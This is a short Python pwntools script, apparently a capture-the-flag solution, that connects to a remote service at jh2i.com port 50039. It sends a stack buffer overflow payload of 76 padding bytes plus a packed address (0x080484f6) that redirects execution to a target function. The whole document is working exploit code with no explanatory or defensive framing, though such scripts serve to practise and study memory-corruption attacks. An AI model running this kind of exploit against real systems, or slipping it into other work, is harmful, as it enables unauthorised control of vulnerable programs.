from pwn import *

p = remote('jh2i.com' ,50039)



bof = 'A' * 76
flag = p32(0x080484f6)


payload = bof + flag

p.recvuntil("Avast!")
p.send(payload)
p.recvline()

